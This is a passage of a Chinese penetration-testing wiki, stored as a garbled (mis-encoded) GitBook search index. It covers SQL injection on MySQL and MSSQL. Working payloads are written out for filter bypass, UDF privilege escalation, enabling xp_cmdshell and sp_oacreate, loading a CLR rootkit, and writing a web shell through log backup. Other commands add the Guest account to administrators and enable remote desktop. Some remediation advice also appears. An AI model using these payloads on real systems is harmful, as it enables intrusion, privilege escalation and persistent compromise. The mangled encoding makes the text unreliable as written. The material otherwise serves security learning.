dbå’Œtableéƒ½å¯æ§ï¼Œè¿‡æ»¤ä¸ä¸¥è°¨ï¼Œå¹¶ä¸”ç›´æ¥æ‹¼æ¥åˆ°å‘½ä»¤ä¸­ï¼Œé€ æˆRCE payload ?db=ctf&table_2_dump=flag2 %0d%0a å‘½ä»¤ ææƒ UDFææƒ UDFï¼ˆUser Define Functionï¼‰è‡ªå®šä¹‰å‡½æ•°ï¼Œæ˜¯æ•°æ®åº“åŠŸèƒ½çš„ä¸€ç§æ‰©å±•ã€‚ç”¨æˆ·é€šè¿‡è‡ªå®šä¹‰å‡½æ•°å¯ä»¥å®ç°åœ¨ MySQL ä¸­æ— æ³•æ–¹ä¾¿å®ç°çš„åŠŸèƒ½ï¼Œå…¶æ·»åŠ çš„æ–°å‡½æ•°éƒ½å¯ä»¥åœ¨ SQL è¯­å¥ä¸­è°ƒç”¨ï¼Œå°±åƒè°ƒç”¨æœ¬æœºå‡½æ•° version () ç­‰æ–¹ä¾¿ã€‚ UDFåˆ¶ä½œï¼šMysql_UDF_BackDoorå¼€å‘å®è·µ - ç¨‹åºä»£ç å­¦ä¹ (Learning Program) - T00ls | ä½è°ƒæ±‚å‘å±• - æ½œå¿ƒä¹ å®‰å…¨ UDFææƒæµç¨‹ å·¥å…·ï¼štools/å¤§é©¬/udf.php at master Â· echohun/tools (github.com) # æ‰¾åˆ°mysqlçš„æ’ä»¶ç›®å½•(å®‰è£…ç›®å½•ä¸‹çš„lib/plugin/) show variables like '%plugin%'; # è¿”å›æ’ä»¶ç›®å½• select @@basedir; # è¿”å›å®‰è£…ç›®å½• # å†™å…¥åŠ¨æ€é“¾æ¥åº“ sqlmapå†™å…¥ æ‰‹åŠ¨åå…­è¿›åˆ¶å†™å…¥ # åˆ›å»ºè‡ªå®šä¹‰å‡½æ•°å¹¶è°ƒç”¨å‘½ä»¤ CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf.dll'; # åˆ›å»ºsys_evalå‡½æ•° select sys_eval('whoami'); # æ‰§è¡Œwhoamiå‘½ä»¤ # åˆ é™¤è‡ªå®šä¹‰å‡½æ•° drop function sys_eval; MOFææƒ Windows Server 2003 C:/Windows/system32/wbem/mof/ ç›®å½•ä¸‹çš„ mof æ–‡ä»¶æ¯ éš”ä¸€æ®µæ—¶é—´ï¼ˆå‡ ç§’é’Ÿå·¦å³ï¼‰éƒ½ä¼šè¢«ç³»ç»Ÿæ‰§è¡Œ Mysqlç»•è¿‡è¡¥å…… é€šç”¨ç»•è¿‡ å¤§å°å†™ç»•è¿‡ ä¿®å¤ï¼šæ­£åˆ™/i åŒå†™ç»•è¿‡ï¼ˆwafå°†å…³é”®å­—æ›¿æ¢ä¸ºç©ºï¼Œä¸”æ¬¡æ•°ä¸º1ï¼‰ uniunionon ä¿®å¤ï¼šæ­£åˆ™/m æ³¨é‡Šç¬¦ç»•è¿‡ # æ‰‹åŠ¨é—­åˆ $sql=\"select * from users where id='$id';\" $id=1' and '1'='2 select * from users where id='1' and '1'='2'; ç©ºæ ¼ç»•è¿‡ %0a %0d%0a /**/ æ‹¬å·ç»•è¿‡ åœ¨MySQLä¸­ï¼Œæ‹¬å·æ˜¯ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢çš„ã€‚å› æ­¤ï¼Œä»»ä½•å¯ä»¥è®¡ç®—å‡ºç»“æœçš„è¯­å¥ï¼Œéƒ½å¯ä»¥ç”¨æ‹¬å·åŒ…å›´èµ·æ¥ã€‚è€Œæ‹¬å·çš„ä¸¤ç«¯ï¼Œå¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼ã€‚ å¼•å·ç»•è¿‡ ä¸è®©ç”¨å•å¼•å· å¯ä»¥ç”¨åå…­è¿›åˆ¶ä»£æ›¿ where(table_name='users') â†’ where(table_name=0x7573657273) è½¬ä¹‰äº†å•å¼•å· å®½å­—èŠ‚æ³¨å…¥ï¼ŒäºŒæ¬¡æ³¨å…¥ å­—ç¬¦ä¸²è¿æ¥å‡½æ•° concat(\"str1\", \",\" ,\"str2\") concat_ws(\",\" , \"str1\" , \"str2\") group_concat(\"str1\", \",\" ,\"str2\") selectç»•è¿‡ å·²çŸ¥è¡¨åå¯ä»¥ç”¨handle ç‰ˆæœ¬>=8.0 mysql 8.0.21ä»¥ä¸Šç‰ˆæœ¬çš„æ–°ç‰¹æ€§ åœ¨å¯¹å½“å‰è¡¨çš„åˆ—åæ³¨å…¥æ—¶ï¼Œå¯ä»¥ç›´æ¥å†™å­—æ®µåï¼Œè€Œæ— éœ€select è¯¥å­—æ®µ from è¯¥è¡¨ é€—å·ç»•è¿‡ substr(databse(),1,1) ç­‰ä»·äº substr(databse() from 1 for 1) select 1,2,3; ç­‰ä»·äº select * from (select 1)a join (select 2)b join (select 3)c; å†…è”æ³¨é‡Š # å¦‚æœåŠ äº†!å°±ä¼šæ‰§è¡Œåœ¨/* */å†…çš„è¯­å¥ /*!union select 1,2*/ # è¦å°†æ•´ä¸ªè¯­å¥å†™å…¥/* */å†… /*!union select */1,2 è¿™æ˜¯é”™è¯¯çš„ # version 5.7.26 /*!00000 select 1,2*/; å¯ä»¥ /*!50726 select 1,2*/; å¯ä»¥ /*!50727 select 1,2*/; ä¸å¯ä»¥ 00000 åˆ° 50726ä¹‹é—´æ˜¯å¯ä»¥çš„ æ— åˆ—åæ³¨å…¥ åœºæ™¯ information_schemè¢«è¿‡æ»¤ï¼Œä¸çŸ¥é“è¡¨çš„å­—æ®µå è§£å†³æ–¹æ³• é€šè¿‡select æ•°å­—å°†å­—æ®µåè®¾ç½®ä¸ºæ•°å­— å†ç”¨è”åˆæŸ¥è¯¢å°†éœ€è¦çš„æ•°æ®å­˜åˆ°ä¸Šå›¾çš„è¡¨ä¸­ é‚£ä¹ˆæƒ³è¦æŸ¥è¯¢usersè¡¨ä¸­çš„usernameå­—æ®µçš„å€¼ select `2` from (select 1,2,3 union select * from user)åˆ«å; # åˆ«åæ˜¯(select 1,2 union select * from user)è¿”å›çš„è¡¨çš„åˆ«å # å¦‚æœåå¼•å·è¢«è¿‡æ»¤ select group_concat(b) from (select 1,2 as b,3 union select * from users)a; é¢„ç¼–è¯‘é—®é¢˜ é¢„ç¼–è¯‘å¤±æ•ˆ PHP-PDOé‡‡ç”¨æœ¬åœ°é¢„å¤„ç† ä¼ å…¥?username='admin',æŸ¥çœ‹æ—¥å¿—å¦‚ä¸‹ å¼€å¯æ°¸ä¹…æ—¥å¿—,åœ¨é…ç½®æ–‡ä»¶ä¸­åŠ å…¥ general_log = 1 general_log_file = æ—¥å¿—è·¯å¾„ å¯ä»¥çœ‹åˆ°é¢„ç¼–è¯‘ä¸ºå…¶è‡ªåŠ¨æ·»åŠ äº†ä¸€å¯¹å¼•å·ï¼Œå¹¶å°†ç”¨æˆ·è¾“å…¥çš„å¼•å·è¿›è¡Œè½¬ä¹‰ã€‚ é‚£ä¹ˆå¦‚æœå°†è¡¨åï¼Œorder by xxå¤„è¿›è¡Œé¢„ç¼–è¯‘å°±ä¼šäº§ç”Ÿå¦‚ä¸‹æ•ˆæœ å¯ä»¥çœ‹åˆ°è¿™äº›è¯­å¥\"å¤±æ•ˆäº†\"ï¼ˆæ²¡æœ‰å¾—åˆ°æƒ³è¦çš„ç»“æœï¼‰ï¼Œæ‰€ä»¥åœ¨å®é™…å¼€å‘ä¸­ï¼Œå¯¹äºè¿™äº›è¯­å¥å¤§æ¦‚ç‡å°±æ˜¯è¿›è¡Œä¸€ä¸ªæ‹¼æ¥å¤„ç†ï¼Œå°±å¾ˆå¯èƒ½å­˜åœ¨sqlæ³¨å…¥ã€‚ é¢„ç¼–è¯‘ä½¿ç”¨é”™è¯¯ ThinkPHP5 SQLæ³¨å…¥æ¼æ´ && PDOçœŸ/ä¼ªé¢„å¤„ç†åˆ†æ | ç¦»åˆ«æ­Œ å †å æ³¨å…¥ $id= $_GET['id']; # é¢„å¤„ç†è¯­å¥ $stmt = $conn->prepare(\"select * from users where id=$id\"); $stmt->execute(); $fraction = $stmt->fetch(); print_r($fraction); ä½¿ç”¨æ¨¡æ‹Ÿé¢„ç¼–è¯‘ï¼Œå¹¶ä¸”æ²¡æœ‰ç»‘å®šå‚æ•° åˆå› ä¸ºPDOé»˜è®¤å¯ä»¥æ”¯æŒå¤šæ¡SQLæ‰§è¡Œï¼Œæ‰€æœ‰é€ æˆäº†å †å æ³¨å…¥ã€‚ ?id=1;create database pdo; æ¼æ´ä¿®å¤ æ­£ç¡®ä½¿ç”¨é¢„ç¼–è¯‘+é»‘åå• é…ç½®é—®é¢˜ ç«™åº“åˆ†ç¦» ä¸å…è®¸å¤–è¿ æ•°æ®åº“ä»¥ä½æƒé™è¿è¡Œ ä¸æ˜¾ç¤ºæŠ¥é”™ ä¸ä½¿ç”¨å¤šè¯­å¥æŸ¥è¯¢ secure_file_priv=NULL å­—ç¬¦é›†ä¿æŒä¸€è‡´ å‚è€ƒæ–‡ç«  Dnslogåœ¨SQLæ³¨å…¥ä¸­çš„å®æˆ˜-å®‰å…¨å®¢ - å®‰å…¨èµ„è®¯å¹³å° https://cloud.tencent.com/developer/article/1938545 å¥‡å®‰ä¿¡æ”»é˜²ç¤¾åŒº-SQLæ³¨å…¥&é¢„ç¼–è¯‘ PDOåœºæ™¯ä¸‹çš„SQLæ³¨å…¥æ¢ç©¶ - å…ˆçŸ¥ç¤¾åŒº Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-25 23:20:43 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/01.Sqlæ³¨å…¥/SqlServer/Webå®‰å…¨ä¹‹Sqlserveræ³¨å…¥.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/01.Sqlæ³¨å…¥/SqlServer/Webå®‰å…¨ä¹‹Sqlserveræ³¨å…¥.html","title":"Sqlæ³¨å…¥--MSSQL","keywords":"","body":"MSSQL_SQL_BYPASS_WIKI/1.2.MSSQLä¿¡æ¯æ”¶é›†.md at master Â· aleenzz/MSSQL_SQL_BYPASS_WIKI https://github.com/aleenzz/MSSQL_SQL_BYPASS_WIKI/blob/master/1.2.MSSQL%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md ç¯å¢ƒæ­å»º cn_windows_server_2008_r2_standard_enterprise_datacenter_and_web_with_sp1_x64_dvd_617598.iso è¡¥ä¸ï¼škb4474419 # æ‰“äº†æ‰èƒ½è£…vmtools æœåŠ¡å™¨ç®¡ç†å™¨æ·»åŠ è§’è‰²IIS è®°å¾—å‹¾é€‰.netå¼€å‘ IISç®¡ç†å™¨æ·»åŠ ç½‘ç«™ï¼Œå¼€å¯çˆ¶è·¯å¾„ Sqlserver 2008 https://download.microsoft.com/download/9/4/8/948966AB-52CA-40F1-8051-0216481065E6/SQLEXPR_x64_CHS.exe å¯†ç ï¼šSA123@ C:\\Windows\\SysWOW64\\SQLServerManager10 å¼€å¯TCP/IP https://github.com/Larryxi/MSSQL-SQLi-Labs åˆ›å»ºæ•°æ®åº“test ä¿®æ”¹æ•°æ®åº“é…ç½®æ–‡ä»¶ åŸºç¡€ ç³»ç»Ÿæ•°æ®åº“ master ï¼šmasteræ•°æ®åº“æ§åˆ¶SQL Serverçš„æ‰€æœ‰æ–¹é¢ã€‚è¿™ä¸ªæ•°æ®åº“ä¸­åŒ…æ‹¬æ‰€æœ‰çš„é…ç½®ä¿¡æ¯ã€ç”¨æˆ·ç™»å½•ä¿¡æ¯ã€å½“å‰æ­£åœ¨æœåŠ¡å™¨ä¸­è¿è¡Œçš„è¿‡ç¨‹çš„ä¿¡æ¯ã€‚ modelï¼šSQL Serverä¸ºç”¨æˆ·æ•°æ®åº“æä¾›çš„æ ·æ¿ï¼Œæ–°çš„ç”¨æˆ·æ•°æ®åº“éƒ½ä»¥modelæ•°æ®åº“ä¸ºåŸºç¡€ msdb ï¼šç”± Enterprise Managerå’ŒAgentä½¿ç”¨ï¼Œè®°å½•ç€ä»»åŠ¡è®¡åˆ’ä¿¡æ¯ã€äº‹ä»¶å¤„ç†ä¿¡æ¯ã€æ•°æ®å¤‡ä»½åŠæ¢å¤ä¿¡æ¯ã€è­¦å‘ŠåŠå¼‚å¸¸ä¿¡æ¯ã€‚ tempdb ï¼šå®ƒä¸ºä¸´æ—¶è¡¨å’Œå…¶ä»–ä¸´æ—¶å·¥ä½œæä¾›äº†ä¸€ä¸ªå­˜å‚¨åŒºã€‚ä¾‹å¦‚ï¼Œæ’åºæ—¶è¦ç”¨åˆ°tempdbæ•°æ®åº“ã€‚æ•°æ®è¢«æ”¾è¿›tempdbæ•°æ®åº“ï¼Œæ’å®Œåºåå†æŠŠç»“æœè¿”å›ç»™ç”¨æˆ·ã€‚æ¯æ¬¡SQL Serveré‡æ–°å¯åŠ¨ï¼Œå®ƒéƒ½ä¼šæ¸…ç©ºtempdbæ•°æ®åº“å¹¶é‡å»ºã€‚æ°¸è¿œä¸è¦åœ¨tempdbæ•°æ®åº“å»ºç«‹éœ€è¦æ°¸ä¹…ä¿å­˜çš„è¡¨ã€‚ æƒé™ saï¼ˆSysAdminï¼‰æƒé™ï¼šæ•°æ®åº“æ“ä½œï¼Œæ–‡ä»¶ç®¡ç†ï¼Œå‘½ä»¤æ‰§è¡Œï¼Œæ³¨å†Œè¡¨è¯»å–ç­‰systemã€‚SQLServeræ•°æ®åº“çš„æœ€é«˜æƒé™ dbï¼ˆDatabase_ownerï¼‰æƒé™ï¼šæ–‡ä»¶ç®¡ç†ï¼Œæ•°æ®åº“æ“ä½œç­‰æƒé™ users-administrators publicæƒé™ï¼šæ•°æ®åº“æ“ä½œ guest-users æ³¨é‡Šç¬¦ -- /**/ å˜é‡å’Œå‡½æ•° @@VERSION @@servername -- æœåŠ¡å™¨å host_name() -- ä¸»æœºå -- åˆ¤æ–­ç«™åº“åˆ†ç¦» host_name()==@@servername db_name() -- å½“å‰æ•°æ®åº“ db_name(num) -- éå†å…¶ä»–æ•°æ®åº“ user user_name() is_member('db_owner') -- åˆ¤æ–­æ˜¯å¦æ˜¯db_owneræƒé™ is_srvrolemember('sysadmin') -- åˆ¤æ–­æ˜¯å¦æ˜¯SAæƒé™ is_srvrolemember('public') -- åˆ¤æ–­æ˜¯å¦æ˜¯publicæƒé™ æ•°æ®è¡¨ master..sysdatabases -- å­˜æ”¾æ‰€æœ‰æ•°æ®åº“ master..sysobjects -- å­˜æ”¾æ‰€æœ‰æ•°æ®è¡¨ -- å­—æ®µåä¸ºname select name from master..sysobjects where xtype='U' -- æŸ¥è¯¢ç”¨æˆ·è‡ªå»ºè¡¨ [dbname].information_schema.columns -- dbçš„æ‰€æœ‰å­—æ®µ å­—æ®µåtable_name,column_name [dbname].information_schema.tables -- dbçš„æ‰€æœ‰è¡¨ å­—æ®µåtable_name æ³¨å…¥æ‰‹æ®µ æŠ¥é”™æ³¨å…¥ åˆ©ç”¨æ˜¾ç¤ºæˆ–éšå¼è½¬æ¢æ¥æŠ¥é”™æ³¨å…¥ select * from admin where id =1 (select CAST(USER as int)) select * from admin where id =1 (select convert(int,user)) ã€SQLæ³¨å…¥ã€‘è¯¦è§£åŸºäºMSSQL â€œorder byâ€è¯­å¥æŠ¥é”™çš„SQLæ³¨å…¥æŠ€æœ¯ â€“ ç»¿ç›Ÿç§‘æŠ€æŠ€æœ¯åšå®¢ https://blog.nsfocus.net/mssql-order-by/ è”åˆæ³¨å…¥ åˆ¤æ–­å­—æ®µ æŸ¥æ‰¾å›æ˜¾ çˆ†åº“ ?id=-1' union select 1,2,db_name(num)-- çˆ†è¡¨ ?id=-1' union select top 1 1,2,name from [dbname]..sysobjects where xtype='u' -- ?id=-1' union select top 1 1,2,name from [dbname]..sysobjects where xtype='u' and name!='[ç¬¬ä¸€æ¡è·å¾—çš„è¡¨å]' -- ?id=-1' union select top 1 1,2,name from [dbname]..sysobjects where xtype='u' and name not in ([å‰é¢çš„è¡¨]) -- çˆ†å­—æ®µ ?id=-1' union select top 1 1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME='users' -- ?id=-1' union select top 1 1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME='users' and COLUMN_NAME and COLUMN_NAME!='id' -- ?id=-1' union select top 1 1,2, COLUMN_NAME from test.information_schema.columns where TABLE_NAME='users' and COLUMN_NAME not in ('id','username') -- çˆ†å­—æ®µå€¼ ```mssql ?id=-1' union select top 1 1,2, COLUMN_NAME from 'users' -- ?id=-1' union select top 1 1,2,username from users where username!='Dumb'-- ?id=-1' union select top 1 1,2,username from users where username not in ('Dumb','Angelina')-- ## å †å æ³¨å…¥ é»˜è®¤å¼€å¯ ## æ—¶é—´ç›²æ³¨ ```mssql if(xxx) waitfor delay '0:0:2' 0:0:2 å°æ—¶:åˆ†é’Ÿ:ç§’ GetShell ç»å¯¹è·¯å¾„ğŸ” xp_dirtree æ˜¯ä¸€ä¸ªå­˜å‚¨è¿‡ç¨‹ï¼ˆstored procedureï¼‰ï¼Œå®ƒæ˜¯ Microsoft SQL Server æ•°æ®åº“å¼•æ“æä¾›çš„ä¸€ä¸ªå†…ç½®è¿‡ç¨‹ã€‚è¯¥è¿‡ç¨‹å¯ç”¨äºæ‰§è¡Œæ–‡ä»¶ç³»ç»Ÿç›®å½•æ ‘æ‰«ææ“ä½œã€‚ ä½¿ç”¨ xp_dirtree å­˜å‚¨è¿‡ç¨‹ï¼Œå¯ä»¥æŒ‡å®šä¸€ä¸ªæ–‡ä»¶è·¯å¾„ï¼Œç„¶åæ‰§è¡Œé€’å½’æ‰«æè¯¥è·¯å¾„ä¸‹çš„æ‰€æœ‰æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ï¼Œå¹¶å°†ç»“æœä»¥è¡¨æ ¼å½¢å¼è¿”å›ç»™ç”¨æˆ· execute master..xp_dirtree 'c:' //åˆ—å‡ºæ‰€æœ‰c:\\æ–‡ä»¶å’Œç›®å½•,å­ç›®å½• execute master..xp_dirtree 'c:',1 //åªåˆ—c:\\æ–‡ä»¶å¤¹ execute master..xp_dirtree 'c:',1,1 //åˆ—c:\\æ–‡ä»¶å¤¹åŠ æ–‡ä»¶ CREATE TABLE tmp (dir varchar(8000),num int,num1 int); insert into tmp(dir,num,num1) execute master..xp_dirtree 'c:',1,1 CREATE TABLE cmdtmp (dir varchar(8000)); insert into cmdtmp(dir) exec master..xp_cmdshell 'for /r c:\\ %i in (1*.aspx) do @echo %i' SAæƒé™ xp_cmdshell æ˜¯å¦å¼€å¯ select count(*) FROM master..sysobjects Where xtype = 'X' AND name = 'xp_cmdshell' è¿”å›å€¼ä¸º1 â†’ å¼€å¯ å¼ºåˆ¶å¼€å¯ -- å°†è¯¥é€‰é¡¹çš„å€¼è®¾ç½®ä¸º1 execute('sp_configure \"show advanced options\",1') -- ä¿å­˜è®¾ç½® execute('reconfigure') -- å°†xp_cmdshellçš„å€¼è®¾ç½®ä¸º1 execute('sp_configure \"xp_cmdshell\", 1') -- ä¿å­˜è®¾ç½® execute('reconfigure') æ¢å¤è¢«åˆ é™¤çš„xp_cmdshell ä¸‹è½½ï¼šhttps://cn.dll-files.com/xplog70.dll.html Exec master.dbo.sp_addextendedproc 'xp_cmdshell','D:\\\\xplog70.dll' å‘½ä»¤æ‰§è¡Œ--æœ‰å›æ˜¾ï¼ˆè¿”å›å‘½ä»¤ç»“æœï¼‰ execute('xp_cmdshell \"whoami\"') è·å¾—ä¸»æœºæƒé™ ç‰ˆæœ¬é—®é¢˜ï¼Ÿï¼Ÿ exec xp_cmdshell 'net user Guest 123456' --ç»™guestç”¨æˆ·è®¾ç½®å¯†ç  exec xp_cmdshell 'net user Guest /active:yes' --æ¿€æ´»guestç”¨æˆ· exec xp_cmdshell 'net localgroup administrators Guest /add' --å°†guestç”¨æˆ·æ·»åŠ åˆ°administratorsç”¨æˆ·ç»„ exec xp_cmdshell 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f' --å¼€å¯3389ç«¯å£ sp_oacreate æ˜¯å¦å¼€å¯ select count(*) from master.dbo.sysobjects where xtype='x' and name='SP_OACREATE' è¿”å›å€¼ä¸º1 â†’ å¼€å¯ å¼ºåˆ¶å¼€å¯ EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; å‘½ä»¤æ‰§è¡Œ--æ— å›æ˜¾ï¼ˆä¸è¿”å›å‘½ä»¤ç»“æœï¼‰ declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c whoami > e:\\\\test2.txt' CLRåŠŸèƒ½ CLRï¼ˆå…¬å…±è¯­è¨€è¿è¡Œæ—¶ï¼‰æä¾›äº† .NET Framework çš„ä»£ç æ‰§è¡Œç¯å¢ƒï¼Œå¯ä»¥é€šè¿‡ .NET Framework æ¥ç¼–å†™å­˜å‚¨è¿‡ç¨‹ã€è§¦å‘å™¨ç­‰åŠŸèƒ½ ã€‚ç®€å•è¯´ï¼Œé€šè¿‡ CLR èƒ½å¤Ÿåœ¨ SQLServer ä¸­æ³¨å†Œä¸€å¥—ç¨‹åºé›†ï¼Œå®ç°æ‰§è¡Œä»»æ„çš„ .NET ä»£ç ã€‚æ—¢ç„¶å¯ä»¥æ‰§è¡Œä»£ç ï¼Œæ­¤æ—¶å°±å¯ä»¥å®ç°å¾ˆå¤šåŠŸèƒ½ã€‚ ä½¿ç”¨ï¼šhttps://github.com/mindspoof/MSSQL-Fileless-Rootkit-WarSQLKit --å¯ç”¨MSSQL CLRåŠŸèƒ½ exec sp_configure 'show advanced options', 1; RECONFIGURE; Exec sp_configure 'clr enabled', 1; RECONFIGURE; --ä¸ºäº†å¯¼å…¥äº†ä¸å®‰å…¨çš„ç¨‹åºé›†ï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†æ•°æ®åº“æ ‡è®°ä¸ºå®‰å…¨ã€‚ ALTER DATABASE [master] SET TRUSTWORTHY ON; --å¯¼å…¥ç¨‹åºé›†ï¼Œå•ç‹¬æ‰§è¡Œ xxx --åˆ›å»ºå­˜å‚¨è¿‡ç¨‹,å•ç‹¬æ‰§è¡Œ CREATE PROCEDURE sp_cmdExec @Command [nvarchar](4000) WITH EXECUTE AS CALLER AS EXTERNAL NAME WarSQLKit.StoredProcedures.CmdExec; --æ‰§è¡Œå‘½ä»¤ EXEC sp_cmdExec 'whoami'; --åˆ é™¤è¯¥ç¨‹åºé›† DROP PROCEDURE sp_cmdExec;DROP ASSEMBLY [WarSQLKit]; db_owneræƒé™ LOGå¤‡ä»½ å­˜åœ¨æ•°æ®åº“å¤‡ä»½æ–‡ä»¶ ç½‘ç«™çš„ç»å¯¹è·¯å¾„ å †å æ³¨å…¥ alter database æ•°æ®åº“å set RECOVERY FULL; --ä¿®æ”¹æ•°æ®åº“æ¢å¤æ¨¡å¼ä¸º å®Œæ•´æ¨¡å¼ create table cmd (a image); --åˆ›å»ºä¸€å¼ è¡¨cmdï¼Œåªæœ‰ä¸€ä¸ªåˆ— aï¼Œç±»å‹ä¸ºimage backup log æ•°æ®åº“å to disk= 'C:\\phpstudy\\WWW\\1.php' with init; --å¤‡ä»½è¡¨åˆ°æŒ‡å®šè·¯å¾„ insert into cmd (a) values(æœ¨é©¬åå…­è¿›åˆ¶); --æ’å…¥ä¸€å¥è¯åˆ°cmdè¡¨é‡Œ backup log æ•°æ®åº“å to disk='C:\\phpstudy\\WWW\\2.php'; --æŠŠæ“ä½œæ—¥å¿—å¤‡ä»½åˆ°æŒ‡å®šæ–‡ä»¶ drop table cmd; --åˆ é™¤cmdè¡¨ 2.phpä¸ºæœ¨é©¬æ–‡ä»¶ å·®å¼‚å¤‡ä»½ æ³¨ï¼šå·®å¼‚å¤‡ä»½æœ‰æ¦‚ç‡ä¼šæŠŠç½‘ç«™æå´©ï¼Œæ‰€ä»¥ä¸å»ºè®®ä½¿ç”¨å·®å¼‚å¤‡ä»½ ç½‘ç«™çš„ç»å¯¹è·¯å¾„ å †å æ³¨å…¥ create table [dbo].[test] ([cmd] [image]) declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=0x6b 68617a backup log @a to disk = @s with init,no_truncate insert into [test](cmd) values(æœ¨é©¬åå…­è¿›åˆ¶) declare @a sysname,@s nvarchar(4000) select @a=db_name(),@s=ç»å¯¹è·¯å¾„åå…­è¿›åˆ¶ backup log @a to disk=@s with init,no_truncate Drop table [test] è¡¥å……--å¾…å­¦ä¹  MSSQL 2017--Pythonå’ŒRè„šæœ¬ æ²™ç›’å‘½ä»¤æ‰§è¡Œ Agent Jobå‘½ä»¤æ‰§è¡Œ https://xz.aliyun.com/t/7534#toc-17 MSSQL GetShellæ–¹æ³• - å…ˆçŸ¥ç¤¾åŒº mssql ææƒæ€»ç»“ - è·³è·³ç³– (tttang.com) å®æˆ˜é—®é¢˜è®°å½• è¯­æ³•æŠ¥é”™ å®é™…ä¸Šæ˜¯sqlåŸºç¡€ä¸è¡Œï¼Œu_lastactiveå­—æ®µç±»å‹ä¸ºæ—¥æœŸç±»å‹ï¼Œåé¢çš„å€¼è·Ÿçš„æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ï¼Œæ¢ä¸€ä¸ªå­—ç¬¦ä¸²ç±»å‹çš„å­—æ®µæˆ–è€…è¿›è¡Œç±»å‹è½¬æ¢å³å¯ ç±»å‹è½¬æ¢ å¦‚ä½•åˆ†é¡µæŸ¥è¯¢ ç›®çš„ SqlServer(mssql) Mysql å–ç¬¬mæ¡åˆ°ç¬¬næ¡è®°å½• select top (n-m+1) name from users where name not in (select top m-1 name from users) select name from users limit m, n ä½¿ç”¨æ¨¡ç³ŠæŸ¥è¯¢ï¼Œé‡ç‚¹æ˜¯æå–å¯æµ®åŠ¨çš„å€¼ å¦‚ä½•å»é‡ distinct Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 18:50:12 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/01.Sqlæ³¨å…¥/é…åˆå…¶ä»–.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/01.Sqlæ³¨å…¥/é…åˆå…¶ä»–.html","title":"é…åˆå…¶ä»–","keywords":"","body":"å…è®¸ä¸Šä¼ çš„æ–‡ä»¶åç¼€ä¿å­˜åœ¨æ•°æ®åº“ä¸­çš„è¡¨ä¸­ï¼Œè¡¨åç±»ä¼¼äºallowï¼Œconfigï¼Œsettingç­‰ï¼Œå¯ä»¥é€šè¿‡sqlæ³¨å…¥æ‰¾åˆ°å¯¹åº”çš„è¡¨æ·»åŠ è„šæœ¬åç¼€ï¼Œç„¶åå°±å¯ä»¥ä¸Šä¼ è„šæœ¬æ–‡ä»¶äº† æ–‡ä»¶ä¸‹è½½åŠŸèƒ½æ˜¯é€šè¿‡uidè¿›è¡Œæ˜ å°„ï¼Œé€šè¿‡ä¿®æ”¹uidå¯¹åº”çš„ç‰©ç†è·¯å¾„ä»è€Œè¾¾åˆ°ä»»æ„æ–‡ä»¶ä¸‹è½½æ¼æ´ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-28 17:27:31 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶ä¸Šä¼ /01.æ¼æ´äº†è§£.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶ä¸Šä¼ /01.æ¼æ´äº†è§£.html","title":"01.æ¼æ´äº†è§£","keywords":"","body":"æ¼æ´åŸç† ç¨‹åºå‘˜æœªå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ï¼Œè€Œå¯¼è‡´çš„ç”¨æˆ·å¯ä»¥è¶Šè¿‡å…¶æœ¬èº«æƒé™å‘æœåŠ¡å™¨ä¸Šä¸Šä¼ å¯æ‰§è¡Œçš„åŠ¨æ€è„šæœ¬æ–‡ä»¶ã€‚è¿™é‡Œä¸Šä¼ çš„æ–‡ä»¶å¯ä»¥æ˜¯æœ¨é©¬ï¼Œç—…æ¯’ï¼Œæ¶æ„è„šæœ¬æˆ–è€…WebShellç­‰ã€‚è¿™ç§æ”»å‡»æ–¹å¼æ˜¯æœ€ä¸ºç›´æ¥å’Œæœ‰æ•ˆçš„ï¼Œâ€œæ–‡ä»¶ä¸Šä¼ â€æœ¬èº«æ²¡æœ‰é—®é¢˜ï¼Œæœ‰é—®é¢˜çš„æ˜¯æ–‡ä»¶ä¸Šä¼ åï¼ŒæœåŠ¡å™¨æ€ä¹ˆå¤„ç†ã€è§£é‡Šæ–‡ä»¶ã€‚å¦‚æœæœåŠ¡å™¨çš„å¤„ç†é€»è¾‘åšçš„ä¸å¤Ÿå®‰å…¨ï¼Œåˆ™ä¼šå¯¼è‡´ä¸¥é‡çš„åæœã€‚ æ¼æ´å±å®³ Webshellç±»ï¼šè„šæœ¬æ–‡ä»¶ XSSç±»ï¼šsvgï¼Œhtmlï¼Œpdfæ–‡ä»¶ï¼Œæ–‡ä»¶åæ³¨å…¥xssä»£ç  å¦‚æœpdfæ”¯æŒé¢„è§ˆï¼Œå¯ä»¥å°è¯•æ³¨å…¥iframeæ 